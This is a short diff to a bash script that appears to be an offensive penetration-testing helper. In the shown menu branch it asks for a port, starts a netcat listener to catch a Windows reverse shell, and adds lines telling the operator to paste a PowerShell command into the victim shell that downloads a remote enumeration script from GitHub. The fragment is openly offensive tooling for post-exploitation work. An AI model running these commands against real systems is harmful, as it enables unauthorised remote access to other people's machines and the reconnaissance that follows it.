@@ -1452,6 +1452,8 @@ while true; do
 		read -p "digit a number of port for the remote Windows Reverse Shell: " PORTA
 		if [[ "$PORTA" =~ ^[0-9]+$ ]];
 		then
+			echo "if you want use winallenum, please copy and paste this command line"
+			echo "[COPY+PASTE] invoke-webrequest -uri \"https://raw.githubusercontent.com/FabioDefilippo/winallenum/master/winallenum.ps1\" -outfile winallenum.tmp; get-content -path winallenum.tmp | set-content -encoding default -path winallenum.ps1; remove-item -path winallenum.tmp"
 			rlwrap nc -lvnp $PORTA
 		fi
 	;;
